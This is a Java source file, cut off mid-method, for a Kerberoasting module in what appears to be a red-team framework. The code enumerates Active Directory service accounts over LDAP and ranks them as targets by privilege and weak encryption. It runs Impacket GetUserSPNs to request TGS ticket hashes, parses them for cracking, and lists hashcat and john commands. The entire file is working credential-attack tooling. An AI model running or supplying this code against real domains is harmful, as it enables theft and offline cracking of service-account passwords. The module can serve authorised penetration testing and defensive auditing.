package com.jabber.jrts.modules.reconnaissance;

import com.jabber.jrts.data.model.*;
import java.time.Instant;
import java.time.ZoneOffset;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Hashtable;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.naming.Context;
import javax.naming.NamingEnumeration;
import javax.naming.NamingException;
import javax.naming.PartialResultException;
import javax.naming.directory.Attribute;
import javax.naming.directory.Attributes;
import javax.naming.directory.SearchControls;
import javax.naming.directory.SearchResult;
import javax.naming.ldap.InitialLdapContext;
import javax.naming.ldap.LdapContext;

/**
 * SPN Enumerator (Kerberoast).
 *
 * Real LDAP-backed Service Principal Name mapper with optional TGS collection.
 *
 * Core workflow:
 * mode selection -> input validation -> processing engine -> execution steps -> result normalization.
 *
 * Primary outcomes:
 * - Enumerate user-bound SPNs through LDAP.
 * - Prioritize kerberoastable targets by privilege and encryption posture.
 * - Optionally request TGS material (via Impacket tooling) for offline analysis.
 */
@JRTSModule(
    id = "spn-enumerator",
    name = "SPN Enumerator (Kerberoast)",
    description = "Enumerate AD user accounts with servicePrincipalName attributes, identify kerberoastable targets, and optionally collect TGS hashes for offline cracking workflows.",
    category = Category.RECONNAISSANCE,
    riskLevel = RiskLevel.HIGH,
    sourceRef = "GetUserSPNs.py / LDAP servicePrincipalName enumeration",
    author = "JRTS"
)
public class SPNEnumeratorModule implements JRTSModuleInterface {

    private static final String MODULE_ID = "spn-enumerator";

    private static final int UF_ACCOUNTDISABLE = 0x00000002;
    private static final int UF_NOT_DELEGATED = 0x00100000;
    private static final int UF_TRUSTED_FOR_DELEGATION = 0x00080000;
    private static final int UF_TRUSTED_TO_AUTH_FOR_DELEGATION = 0x01000000;

    private static final int DEFAULT_LDAP_PORT = 389;
    private static final int DEFAULT_LDAPS_PORT = 636;
    private static final int DEFAULT_CONNECT_TIMEOUT_MS = 10_000;
    private static final int DEFAULT_READ_TIMEOUT_MS = 15_000;
    private static final int DEFAULT_MAX_RESULTS = 5_000;
    private static final int MAX_ALLOWED_RESULTS = 50_000;

    private static final int DEFAULT_COMMAND_TIMEOUT_MS = 60_000;
    private static final int DEFAULT_MAX_TGS_HASHES = 100;

    private static final long AD_EPOCH_DIFF_SECONDS = 11_644_473_600L;
    private static final DateTimeFormatter ISO_FMT = DateTimeFormatter.ISO_OFFSET_DATE_TIME;

    private static final String[] SPN_ATTRIBUTES = new String[] {
        "sAMAccountName",
        "userPrincipalName",
        "displayName",
        "mail",
        "distinguishedName",
        "servicePrincipalName",
        "userAccountControl",
        "adminCount",
        "memberOf",
        "pwdLastSet",
        "lastLogonTimestamp",
        "msDS-SupportedEncryptionTypes",
        "objectClass"
    };

    private static final Set<String> PRIVILEGED_GROUP_KEYWORDS = Set.of(
        "domain admins",
        "enterprise admins",
        "schema admins",
        "administrators",
        "account operators",
        "server operators",
        "backup operators"
    );

    private static final Set<String> HIGH_VALUE_SERVICE_TYPES = Set.of(
        "MSSQLSVC",
        "HTTP",
        "CIFS",
        "HOST",
        "LDAP",
        "TERMSRV",
        "FIMSERVICE",
        "EXCHANGEMDB"
    );

    private static final Pattern KRB5_HASH_PATTERN = Pattern.compile("(\\$krb5tgs\\$[^\\r\\n]+)");
    private static final Pattern TARGET_WITH_CREDS_PATTERN = Pattern.compile("^([^/\\\\:]+)(?:[\\\\/]([^:]+)(?::(.*))?)?$");

    private final Map<String, Boolean> commandAvailabilityCache = new ConcurrentHashMap<>();

    @Override
    public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.select("mode", "Execution Mode", List.of(
                    "spn_inventory",
                    "kerberoast_targeting",
                    "tgs_collection",
                    "account_confirmation"
                ))
                .required()
                .defaultValue("spn_inventory")
                .group("Mode")
                .helpText("SPN module-specific operational modes and output models."),
            ModuleInputField.text("focus_account", "Focus Account")
                .placeholder("svc_sql or svc_web@contoso.local")
                .group("Mode")
                .modes("account_confirmation")
                .helpText("Required when mode=account_confirmation."),

            ModuleInputField.text("target", "Target Domain / DC")
                .required().placeholder("contoso.local or dc01.contoso.local")
                .group("Target")
                .helpText("Domain FQDN or DC hostname/IP. Legacy domain/user:pass target syntax is still accepted."),
            ModuleInputField.text("dc_ip", "DC IP Address")
                .placeholder("10.10.10.10")
                .group("Target")
                .helpText("Optional explicit DC address used in LDAP and Kerberos tooling commands."),
            ModuleInputField.text("base_dn", "Base DN Override")
                .placeholder("DC=contoso,DC=local")
                .group("Target")
                .helpText("Optional; if omitted, defaultNamingContext is resolved from RootDSE."),

            ModuleInputField.text("username", "Username")
                .placeholder("CONTOSO\\operator or operator@contoso.local")
                .group("Authentication"),
            ModuleInputField.password("password", "Password")
                .group("Authentication"),
            ModuleInputField.text("hashes", "NTLM Hashes (LM:NT)")
                .placeholder("LMHASH:NTHASH")
                .group("Authentication")
                .helpText("Accepted for tooling context; Java LDAP simple bind remains password or Kerberos based."),
            ModuleInputField.checkbox("use_kerberos", "Use Kerberos Authentication")
                .group("Authentication"),
            ModuleInputField.password("aes_key", "AES Key (Kerberos)")
                .placeholder("hex-encoded AES256 key")
                .group("Authentication"),

            ModuleInputField.checkbox("use_ldaps", "Use LDAPS")
                .group("Connection"),
            ModuleInputField.text("ldap_port", "LDAP Port")
                .placeholder("389 or 636")
                .group("Connection"),
            ModuleInputField.text("connect_timeout_ms", "Connect Timeout (ms)")
                .placeholder(String.valueOf(DEFAULT_CONNECT_TIMEOUT_MS))
                .group("Connection"),
            ModuleInputField.text("read_timeout_ms", "Read Timeout (ms)")
                .placeholder(String.valueOf(DEFAULT_READ_TIMEOUT_MS))
                .group("Connection"),

            ModuleInputField.text("spn_filter", "SPN Filter")
                .placeholder("MSSQLSvc|HTTP|CIFS")
                .group("Options")
                .helpText("Case-insensitive service type filter. Supports alternation with | separators."),
            ModuleInputField.checkbox("include_disabled", "Include Disabled Accounts")
                .defaultValue("false")
                .group("Options"),
            ModuleInputField.checkbox("include_computer_accounts", "Include Computer Accounts")
                .defaultValue("false")
                .group("Options")
                .helpText("Kerberoast targeting defaults to user objects; enable only when explicitly needed."),
            ModuleInputField.checkbox("delegation_only", "Delegation-Capable Accounts Only")
                .defaultValue("false")
                .group("Options"),
            ModuleInputField.text("max_results", "Maximum LDAP Objects")
                .placeholder(String.valueOf(DEFAULT_MAX_RESULTS))
                .group("Options"),

            ModuleInputField.checkbox("request_tgs", "Request TGS Hashes")
                .defaultValue("false")
                .group("TGS")
                .modes("tgs_collection")
                .helpText("Executes Impacket GetUserSPNs ticket requests and parses $krb5tgs$ material."),
            ModuleInputField.checkbox("use_impacket", "Use Impacket GetUserSPNs")
                .defaultValue("true")
                .group("TGS")
                .modes("tgs_collection"),
            ModuleInputField.text("command_timeout_ms", "TGS Command Timeout (ms)")
                .placeholder(String.valueOf(DEFAULT_COMMAND_TIMEOUT_MS))
                .group("TGS")
                .modes("tgs_collection"),
            ModuleInputField.text("max_tgs_hashes", "Maximum Parsed TGS Hashes")
                .placeholder(String.valueOf(DEFAULT_MAX_TGS_HASHES))
                .group("TGS")
                .modes("tgs_collection")
                .helpText("Caps parsed $krb5tgs$ lines retained in module output.")
        );
    }

    @Override
    public CompletableFuture<ModuleResult> execute(Map<String, String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(() -> {
            ModuleResult result = new ModuleResult(ctx.getTaskId(), MODULE_ID);
            LdapContext ldap = null;

            try {
                long startedAt = System.currentTimeMillis();
                ctx.log("[*] Starting SPN Enumerator module");
                ctx.reportProgress(5);

                ModuleConfig config = parseConfig(input);
                List<String> validationErrors = validateConfig(config);
                if (!validationErrors.isEmpty()) {
                    String message = String.join("; ", validationErrors);
                    result.fail("Validation failed: " + message);
                    ctx.log("[!] Validation failed: " + message);
                    return result;
                }

                ExecutionDiagnostics diagnostics = new ExecutionDiagnostics();

                ctx.log("[*] Mode: " + config.mode.value);
                ctx.log("[*] Target: " + config.target);
                ctx.log("[*] Authentication: " + authModeLabel(config));
                ctx.reportProgress(20);

                ldap = openLdapContext(config);
                String baseDn = resolveBaseDn(ldap, config);
                String domain = baseDnToDomain(baseDn);
                if (domain.isBlank()) {
                    domain = config.target;
                }

                ctx.log("[*] LDAP bind successful to " + buildLdapUrl(config));
                ctx.log("[*] Base DN: " + baseDn);
                ctx.reportProgress(40);

                List<SpnRecord> allRecords = fetchSpnRecords(ldap, baseDn, config, ctx);
                List<SpnRecord> filteredRecords = new ArrayList<>();
                for (SpnRecord record : allRecords) {
                    if (matchesFilters(record, config)) {
                        filteredRecords.add(record);
                    }
                }

                filteredRecords.sort(this::compareRecords);
                ctx.log("[*] SPN records matched: " + filteredRecords.size());
                ctx.reportProgress(65);

                List<Map<String, Object>> findings = new ArrayList<>();
                for (SpnRecord record : filteredRecords) {
                    Map<String, Object> finding = toFinding(record);
                    findings.add(finding);
                    result.addFinding(finding);
                }

                List<TgsTicketRecord> tgsTickets = List.of();
                if (config.mode == ModuleMode.TGS_COLLECTION || config.requestTgs) {
                    tgsTickets = requestTgsHashes(config, filteredRecords, ctx, diagnostics);
                }
                ctx.reportProgress(82);

                Map<String, Object> summary = buildSummary(allRecords, filteredRecords, tgsTickets, config);
                Map<String, Object> modeResult = buildModeResult(filteredRecords, tgsTickets, config);

                Map<String, Object> executionMetadata = new LinkedHashMap<>();
                executionMetadata.put("ldap_url", buildLdapUrl(config));
                executionMetadata.put("base_dn", baseDn);
                executionMetadata.put("ldap_filter", buildLdapFilter(config));
                executionMetadata.put("requested_attributes", Arrays.asList(SPN_ATTRIBUTES));
                executionMetadata.put("auth_mode", authModeLabel(config));
                executionMetadata.put("tgs_request_enabled", config.requestTgs || config.mode == ModuleMode.TGS_COLLECTION);
                executionMetadata.put("tools_used", new ArrayList<>(diagnostics.toolUsage));
                executionMetadata.put("command_executions", diagnostics.commandExecutions);
                executionMetadata.put("executed_commands", diagnostics.executedCommands);
                executionMetadata.put("command_log", diagnostics.commandLog);
                executionMetadata.put("warnings", diagnostics.warnings);
                executionMetadata.put("elapsed_ms", System.currentTimeMillis() - startedAt);

                Map<String, Object> output = new LinkedHashMap<>();
                output.put("pipeline", List.of(
                    "mode_selection",
                    "input_validation",
                    "processing_engine",
                    "execution_steps",
                    "result_normalization",
                    "structured_output"
                ));
                output.put("mode", config.mode.value);
                output.put("domain", domain);
                output.put("base_dn", baseDn);
                output.put("summary", summary);
                output.put("spn_accounts", findings);
                output.put("operational_stack", buildOperationalStack());
                output.put(config.mode.resultKey, modeResult);
                output.put("execution_metadata", executionMetadata);

                result.setNormalizedOutput(buildNormalizedOutput(summary, findings, tgsTickets, config));
                result.complete(output);

                ctx.log("[+] SPN Enumeration completed with " + findings.size() + " candidate account(s)");
                ctx.reportProgress(100);

            } catch (NamingException e) {
                result.fail("LDAP execution failed: " + e.getMessage());
                ctx.log("[!] LDAP execution failed: " + e.getMessage());
            } catch (Exception e) {
                result.fail("SPN Enumeration failed: " + e.getMessage());
                ctx.log("[!] ERROR: " + e.getMessage());
            } finally {
                closeQuietly(ldap);
            }

            return result;
        });
    }

    protected LdapContext openLdapContext(ModuleConfig config) throws NamingException {
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, buildLdapUrl(config));
        env.put(Context.REFERRAL, "ignore");
        env.put("com.sun.jndi.ldap.connect.timeout", String.valueOf(config.connectTimeoutMs));
        env.put("com.sun.jndi.ldap.read.timeout", String.valueOf(config.readTimeoutMs));

        if (config.useKerberos) {
            env.put(Context.SECURITY_AUTHENTICATION, "GSSAPI");
            if (!config.username.isBlank()) {
                env.put(Context.SECURITY_PRINCIPAL, normalizePrincipal(config.username, config.target));
            }
            if (!config.password.isBlank()) {
                env.put(Context.SECURITY_CREDENTIALS, config.password);
            }
        } else if (!config.username.isBlank()) {
            env.put(Context.SECURITY_AUTHENTICATION, "simple");
            env.put(Context.SECURITY_PRINCIPAL, normalizePrincipal(config.username, config.target));
            env.put(Context.SECURITY_CREDENTIALS, config.password);
        } else {
            env.put(Context.SECURITY_AUTHENTICATION, "none");
        }

        return new InitialLdapContext(env, null);
    }

    protected String resolveBaseDn(LdapContext ldap, ModuleConfig config) throws NamingException {
        if (!config.baseDn.isBlank()) {
            return config.baseDn;
        }

        Attributes rootDse = ldap.getAttributes("", new String[] {"defaultNamingContext"});
        Attribute namingContext = rootDse.get("defaultNamingContext");
        if (namingContext != null && namingContext.size() > 0) {
            return String.valueOf(namingContext.get()).trim();
        }

        if (looksLikeDomainName(config.target)) {
            return domainToBaseDn(config.target);
        }

        if (config.username.contains("@")) {
            String domain = config.username.substring(config.username.indexOf('@') + 1);
            if (looksLikeDomainName(domain)) {
                return domainToBaseDn(domain);
            }
        }

        throw new NamingException("Unable to resolve Base DN from RootDSE. Provide base_dn explicitly.");
    }

    protected List<SpnRecord> fetchSpnRecords(
            LdapContext ldap,
            String baseDn,
            ModuleConfig config,
            TaskContext ctx) throws NamingException {

        String filter = buildLdapFilter(config);
        ctx.log("[*] LDAP filter: " + filter);

        SearchControls controls = new SearchControls();
        controls.setSearchScope(SearchControls.SUBTREE_SCOPE);
        controls.setReturningAttributes(SPN_ATTRIBUTES);
        controls.setCountLimit(config.maxResults);

        List<SpnRecord> records = new ArrayList<>();
        NamingEnumeration<SearchResult> results = ldap.search(baseDn, filter, controls);
        try {
            while (results.hasMore()) {
                SpnRecord record = toSpnRecord(results.next());
                if (record != null) {
                    records.add(record);
                }
            }
        } catch (PartialResultException ignored) {
            // AD may return partial results when referrals are suppressed.
        } finally {
            if (results != null) {
                results.close();
            }
        }

        return records;
    }

    protected List<TgsTicketRecord> requestTgsHashes(
            ModuleConfig config,
            List<SpnRecord> records,
            TaskContext ctx,
            ExecutionDiagnostics diagnostics) {

        if (records.isEmpty()) {
            diagnostics.warnings.add("TGS request skipped: no candidate SPN records");
            return List.of();
        }

        if (!config.useImpacket) {
            diagnostics.warnings.add("TGS request skipped: use_impacket is disabled");
            return List.of();
        }

        String tool = firstAvailableCommand(List.of("impacket-GetUserSPNs", "GetUserSPNs.py"));
        if (tool.isBlank()) {
            diagnostics.warnings.add("TGS request skipped: Impacket GetUserSPNs tool not found");
            return List.of();
        }

        List<String> command = buildGetUserSpnsCommand(config, tool);
        if (command.isEmpty()) {
            diagnostics.warnings.add("TGS request skipped: unable to build GetUserSPNs command from provided credentials");
            return List.of();
        }

        command.add("-request");

        ctx.log("[*] Requesting TGS material with " + tool);
        CommandExecutionResult commandResult = runCommand(command, config.commandTimeoutMs);
        recordCommandExecution(diagnostics, tool, command, commandResult);

        if (commandResult.timedOut) {
            diagnostics.warnings.add("TGS request command timed out");
            return List.of();
        }

        String combinedOutput = commandResult.combinedOutput();
        List<TgsTicketRecord> parsed = parseTgsHashes(combinedOutput, config.maxTgsHashes);
        if (parsed.isEmpty()) {
            diagnostics.warnings.add("No $krb5tgs$ material parsed from TGS request output");
        }
        return parsed;
    }

    protected boolean isCommandAvailable(String command) {
        return commandAvailabilityCache.computeIfAbsent(command, cmd -> {
            List<String> checkCommand = isWindows()
                ? List.of("where", cmd)
                : List.of("which", cmd);

            CommandExecutionResult result = runCommand(checkCommand, 2_000);
            return !result.timedOut && result.exitCode == 0;
        });
    }

    protected CommandExecutionResult runCommand(List<String> command, long timeoutMs) {
        long startedAt = System.currentTimeMillis();
        Process process = null;

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(command);
            Process runningProcess = processBuilder.start();
            process = runningProcess;

            StringBuilder stdout = new StringBuilder();
            StringBuilder stderr = new StringBuilder();

            Thread outThread = Thread.ofVirtual().start(() -> copyStream(runningProcess.getInputStream(), stdout));
            Thread errThread = Thread.ofVirtual().start(() -> copyStream(runningProcess.getErrorStream(), stderr));

            boolean finished = runningProcess.waitFor(timeoutMs, TimeUnit.MILLISECONDS);
            if (!finished) {
                runningProcess.destroyForcibly();
                joinQuietly(outThread, 200);
                joinQuietly(errThread, 200);
                return new CommandExecutionResult(-1, stdout.toString(), stderr.toString(), true, System.currentTimeMillis() - startedAt);
            }

            joinQuietly(outThread, 500);
            joinQuietly(errThread, 500);

            return new CommandExecutionResult(
                runningProcess.exitValue(),
                stdout.toString(),
                stderr.toString(),
                false,
                System.currentTimeMillis() - startedAt
            );
        } catch (Exception e) {
            return new CommandExecutionResult(-1, "", e.getMessage(), false, System.currentTimeMillis() - startedAt);
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
    }

    private void recordCommandExecution(
            ExecutionDiagnostics diagnostics,
            String tool,
            List<String> command,
            CommandExecutionResult result) {

        diagnostics.commandExecutions++;
        diagnostics.toolUsage.add(tool);

        String commandText = String.join(" ", command);
        diagnostics.executedCommands.add(commandText);

        Map<String, Object> row = new LinkedHashMap<>();
        row.put("tool", tool);
        row.put("command", commandText);
        row.put("status", result.timedOut ? "timeout" : (result.exitCode == 0 ? "success" : "failed"));
        row.put("exit_code", result.exitCode);
        row.put("timed_out", result.timedOut);
        row.put("duration_ms", result.durationMs);

        String stderrPreview = firstLine(result.stderr);
        if (!stderrPreview.isBlank()) {
            row.put("stderr_preview", stderrPreview);
        }

        String stdoutPreview = firstLine(result.stdout);
        if (!stdoutPreview.isBlank()) {
            row.put("stdout_preview", stdoutPreview);
        }

        diagnostics.commandLog.add(row);
    }

    private List<String> buildGetUserSpnsCommand(ModuleConfig config, String tool) {
        if (config.username.isBlank()) {
            return List.of();
        }

        String toolIdentityDomain = firstNonBlank(config.toolIdentityDomain, config.target);
        String toolIdentityUser = config.toolIdentityUser;
        if (toolIdentityUser.isBlank()) {
            toolIdentityUser = config.username.contains("\\")
                ? config.username.substring(config.username.indexOf('\\') + 1)
                : config.username;
        }

        String identity = toolIdentityDomain + "/" + toolIdentityUser;
        if (!config.password.isBlank()) {
            identity = identity + ":" + config.password;
        }

        List<String> command = new ArrayList<>();
        command.add(tool);
        command.add(identity);

        if (!config.dcIp.isBlank()) {
            command.add("-dc-ip");
            command.add(config.dcIp);
        }

        if (config.useKerberos) {
            command.add("-k");
            if (config.password.isBlank() && config.hashes.isBlank()) {
                command.add("-no-pass");
            }
        }

        if (!config.hashes.isBlank()) {
            command.add("-hashes");
            command.add(config.hashes);
        }

        if (!config.aesKey.isBlank()) {
            command.add("-aesKey");
            command.add(config.aesKey);
        }

        return command;
    }

    private List<TgsTicketRecord> parseTgsHashes(String output, int maxHashes) {
        if (output == null || output.isBlank()) {
            return List.of();
        }

        List<TgsTicketRecord> parsed = new ArrayList<>();
        Set<String> dedup = new LinkedHashSet<>();

        Matcher matcher = KRB5_HASH_PATTERN.matcher(output);
        while (matcher.find()) {
            String hashLine = matcher.group(1).trim();
            if (!dedup.add(hashLine)) {
                continue;
            }

            TgsTicketRecord record = parseTgsHashLine(hashLine);
            parsed.add(record);
            if (parsed.size() >= maxHashes) {
                break;
            }
        }
        return parsed;
    }

    private TgsTicketRecord parseTgsHashLine(String hashLine) {
        TgsTicketRecord record = new TgsTicketRecord();
        record.hash = hashLine;
        record.hashType = "krb5tgs";

        String[] parts = hashLine.split("\\$");
        if (parts.length >= 5) {
            record.encryptionType = parts[2];

            String userPart = parts[3];
            if (userPart.startsWith("*")) {
                userPart = userPart.substring(1);
            }
            record.accountName = userPart;

            record.realm = parts[4];
        }

        if (parts.length >= 6) {
            String spnPart = parts[5];
            int separator = spnPart.indexOf('*');
            if (separator >= 0) {
                spnPart = spnPart.substring(0, separator);
            }
            record.servicePrincipalName = spnPart;
        }

        record.hashcatMode = switch (record.encryptionType) {
            case "23" -> "13100";
            case "17" -> "19600";
            case "18" -> "19700";
            default -> "13100";
        };

        return record;
    }

    private SpnRecord toSpnRecord(SearchResult entry) throws NamingException {
        Attributes attrs = entry.getAttributes();
        if (attrs == null) {
            return null;
        }

        SpnRecord record = new SpnRecord();
        record.samAccountName = firstNonBlank(
            getStringAttribute(attrs, "sAMAccountName"),
            getStringAttribute(attrs, "userPrincipalName"),
            entry.getName()
        );
        record.userPrincipalName = getStringAttribute(attrs, "userPrincipalName");
        record.displayName = getStringAttribute(attrs, "displayName");
        record.mail = getStringAttribute(attrs, "mail");
        record.distinguishedName = firstNonBlank(
            getStringAttribute(attrs, "distinguishedName"),
            safeNameInNamespace(entry),
            entry.getName()
        );

        record.servicePrincipalNames = getListAttribute(attrs, "servicePrincipalName");
        record.serviceTypes = extractServiceTypes(record.servicePrincipalNames);
        record.objectClasses = lowerCaseSet(getListAttribute(attrs, "objectClass"));

        record.userAccountControl = parseInteger(getStringAttribute(attrs, "userAccountControl"), 0);
        record.adminCount = parseInteger(getStringAttribute(attrs, "adminCount"), 0);
        record.memberOf = getListAttribute(attrs, "memberOf");

        record.pwdLastSetRaw = parseLong(getStringAttribute(attrs, "pwdLastSet"), 0L);
        record.lastLogonTimestampRaw = parseLong(getStringAttribute(attrs, "lastLogonTimestamp"), 0L);
        record.passwordLastSet = fileTimeToIso(record.pwdLastSetRaw);
        record.passwordAgeDays = computeAgeDays(record.pwdLastSetRaw);
        record.lastLogonTimestamp = fileTimeToIso(record.lastLogonTimestampRaw);
        record.lastLogonAgeDays = computeAgeDays(record.lastLogonTimestampRaw);

        record.supportedEncryptionTypes = parseInteger(getStringAttribute(attrs, "msDS-SupportedEncryptionTypes"), 0);
        record.encryptionFlags = decodeEncryptionTypes(record.supportedEncryptionTypes);
        record.weakEncryption = isWeakEncryption(record.supportedEncryptionTypes);

        record.disabled = hasUacFlag(record.userAccountControl, UF_ACCOUNTDISABLE);
        record.notDelegated = hasUacFlag(record.userAccountControl, UF_NOT_DELEGATED);
        record.trustedForDelegation = hasUacFlag(record.userAccountControl, UF_TRUSTED_FOR_DELEGATION);
        record.trustedToAuthForDelegation = hasUacFlag(record.userAccountControl, UF_TRUSTED_TO_AUTH_FOR_DELEGATION);

        record.isComputer = record.objectClasses.contains("computer") || record.samAccountName.endsWith("$");
        record.privileged = isPrivileged(record);
        record.kerberoastable = !record.servicePrincipalNames.isEmpty() && !record.disabled;
        record.highValueService = hasHighValueService(record.serviceTypes);
        record.riskTags = buildRiskTags(record);
        record.riskScore = scoreRecord(record);
        record.riskLevel = riskLevel(record.riskScore);
        return record;
    }

    private boolean matchesFilters(SpnRecord record, ModuleConfig config) {
        if (!config.includeDisabled && record.disabled) {
            return false;
        }

        if (!config.includeComputerAccounts && record.isComputer) {
            return false;
        }

        if (config.delegationOnly && !record.trustedForDelegation && !record.trustedToAuthForDelegation) {
            return false;
        }

        if (!config.spnFilterTokens.isEmpty()) {
            boolean matches = false;
            for (String spn : record.servicePrincipalNames) {
                String lowered = spn.toLowerCase(Locale.ROOT);
                for (String token : config.spnFilterTokens) {
                    if (lowered.contains(token)) {
                        matches = true;
                        break;
                    }
                }
                if (matches) {
                    break;
                }
            }
            if (!matches) {
                return false;
            }
        }

        if (config.mode == ModuleMode.ACCOUNT_CONFIRMATION) {
            String focus = normalizeFocus(config.focusAccount);
            String sam = normalizeFocus(record.samAccountName);
            String upn = normalizeFocus(record.userPrincipalName);
            String dn = normalizeFocus(record.distinguishedName);

            if (config.focusMatchExact) {
                return focus.equals(sam) || focus.equals(upn) || focus.equals(dn);
            }
            return sam.contains(focus) || upn.contains(focus) || dn.contains(focus);
        }

        return true;
    }

    private int compareRecords(SpnRecord left, SpnRecord right) {
        int scoreDiff = Integer.compare(right.riskScore, left.riskScore);
        if (scoreDiff != 0) {
            return scoreDiff;
        }
        return left.samAccountName.compareToIgnoreCase(right.samAccountName);
    }

    private Map<String, Object> toFinding(SpnRecord record) {
        Map<String, Object> finding = new LinkedHashMap<>();
        finding.put("account_name", record.samAccountName);
        finding.put("user_principal_name", record.userPrincipalName);
        finding.put("display_name", record.displayName);
        finding.put("mail", record.mail);
        finding.put("distinguished_name", record.distinguishedName);
        finding.put("object_type", record.isComputer ? "computer" : "user");
        finding.put("service_principal_names", record.servicePrincipalNames);
        finding.put("service_types", record.serviceTypes);
        finding.put("kerberoastable", record.kerberoastable);
        finding.put("disabled", record.disabled);
        finding.put("privileged", record.privileged);
        finding.put("admin_count", record.adminCount);
        finding.put("member_of", record.memberOf);
        finding.put("high_value_service", record.highValueService);
        finding.put("delegation", Map.of(
            "trusted_for_delegation", record.trustedForDelegation,
            "trusted_to_auth_for_delegation", record.trustedToAuthForDelegation,
            "not_delegated", record.notDelegated
        ));
        finding.put("encryption", Map.of(
            "supported_encryption_types", record.supportedEncryptionTypes,
            "flags", record.encryptionFlags,
            "weak_encryption", record.weakEncryption
        ));
        finding.put("password_last_set", record.passwordLastSet);
        finding.put("password_age_days", record.passwordAgeDays);
        finding.put("last_logon_timestamp", record.lastLogonTimestamp);
        finding.put("last_logon_age_days", record.lastLogonAgeDays);
        finding.put("risk_score", record.riskScore);
        finding.put("risk_level", record.riskLevel);
        finding.put("risk_tags", record.riskTags);
        return finding;
    }

    private Map<String, Object> buildSummary(
            List<SpnRecord> allRecords,
            List<SpnRecord> filteredRecords,
            List<TgsTicketRecord> tgsTickets,
            ModuleConfig config) {

        long kerberoastable = filteredRecords.stream().filter(record -> record.kerberoastable).count();
        long privileged = filteredRecords.stream().filter(record -> record.privileged).count();
        long weakEncryption = filteredRecords.stream().filter(record -> record.weakEncryption).count();
        long delegationCapable = filteredRecords.stream()
            .filter(record -> record.trustedForDelegation || record.trustedToAuthForDelegation)
            .count();
        long computerAccounts = filteredRecords.stream().filter(record -> record.isComputer).count();

        Map<String, Object> summary = new LinkedHashMap<>();
        summary.put("mode", config.mode.value);
        summary.put("total_ldap_objects", allRecords.size());
        summary.put("total_spn_accounts", filteredRecords.size());
        summary.put("kerberoastable_count", kerberoastable);
        summary.put("privileged_count", privileged);
        summary.put("weak_encryption_count", weakEncryption);
        summary.put("delegation_capable_count", delegationCapable);
        summary.put("computer_account_count", computerAccounts);
        summary.put("tgs_hash_count", tgsTickets.size());
        return summary;
    }

    private Map<String, Object> buildModeResult(
            List<SpnRecord> records,
            List<TgsTicketRecord> tgsTickets,
            ModuleConfig config) {
        return switch (config.mode) {
            case SPN_INVENTORY -> buildSpnInventoryResult(records);
            case KERBEROAST_TARGETING -> buildKerberoastTargetingResult(records);
            case TGS_COLLECTION -> buildTgsCollectionResult(records, tgsTickets, config);
            case ACCOUNT_CONFIRMATION -> buildAccountConfirmationResult(records, config);
        };
    }

    private Map<String, Object> buildSpnInventoryResult(List<SpnRecord> records) {
        Map<String, Integer> serviceTypeDistribution = new LinkedHashMap<>();
        int totalSpnValues = 0;

        for (SpnRecord record : records) {
            totalSpnValues += record.servicePrincipalNames.size();
            for (String serviceType : record.serviceTypes) {
                serviceTypeDistribution.put(serviceType, serviceTypeDistribution.getOrDefault(serviceType, 0) + 1);
            }
        }

        Map<String, Object> result = new LinkedHashMap<>();
        result.put("account_count", records.size());
        result.put("spn_value_count", totalSpnValues);
        result.put("service_type_distribution", serviceTypeDistribution);
        result.put("top_accounts", records.stream().limit(25).map(this::compactAccountView).toList());
        return result;
    }

    private Map<String, Object> buildKerberoastTargetingResult(List<SpnRecord> records) {
        List<Map<String, Object>> highValueTargets = records.stream()
            .filter(record -> record.kerberoastable && (record.privileged || record.highValueService || record.riskScore >= 75))
            .map(this::compactTargetView)
            .toList();

        List<Map<String, Object>> prioritized = records.stream()
            .filter(record -> record.kerberoastable)
            .limit(30)
            .map(this::compactTargetView)
            .toList();

        Map<String, Object> result = new LinkedHashMap<>();
        result.put("prioritized_targets", prioritized);
        result.put("high_value_targets", highValueTargets);
        result.put("recommended_sequence", prioritized.stream()
            .map(row -> row.get("account_name"))
            .toList());
        return result;
    }

    private Map<String, Object> buildTgsCollectionResult(
            List<SpnRecord> records,
            List<TgsTicketRecord> tgsTickets,
            ModuleConfig config) {

        Map<String, Integer> byAccount = new LinkedHashMap<>();
        for (TgsTicketRecord record : tgsTickets) {
            String account = firstNonBlank(record.accountName, "unknown");
            byAccount.put(account, byAccount.getOrDefault(account, 0) + 1);
        }

        List<Map<String, Object>> accountSnapshot = records.stream()
            .filter(record -> record.kerberoastable)
            .limit(30)
            .map(this::compactTargetView)
            .toList();

        Map<String, Object> result = new LinkedHashMap<>();
        result.put("request_tgs", config.requestTgs || config.mode == ModuleMode.TGS_COLLECTION);
        result.put("kerberoastable_accounts", accountSnapshot);
        result.put("tgs_hash_count", tgsTickets.size());
        result.put("tickets", tgsTickets.stream().map(TgsTicketRecord::toMap).toList());
        result.put("hashes_by_account", byAccount);
        result.put("offline_cracking_guidance", List.of(
            "hashcat -m 13100 kerberoast_hashes.txt <wordlist>",
            "hashcat -m 19600 kerberoast_hashes.txt <wordlist>",
            "hashcat -m 19700 kerberoast_hashes.txt <wordlist>",
            "john --format=krb5tgs kerberoast_hashes.txt"
        ));
        return result;
    }

    private Map<String, Object> buildAccountConfirmationResult(List<SpnRecord> records, ModuleConfig config) {
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("focus_account", config.focusAccount);
        result.put("confirmed", !records.isEmpty());
        result.put("match_count", records.size());
        result.put("matches", records.stream().map(this::compactTargetView).toList());
        return result;
    }

    private Map<String, Object> compactAccountView(SpnRecord record) {
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("account_name", record.samAccountName);
        out.put("service_types", record.serviceTypes);
        out.put("spn_count", record.servicePrincipalNames.size());
        out.put("object_type", record.isComputer ? "computer" : "user");
        out.put("kerberoastable", record.kerberoastable);
        return out;
    }

    private Map<String, Object> compactTargetView(SpnRecord record) {
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("account_name", record.samAccountName);
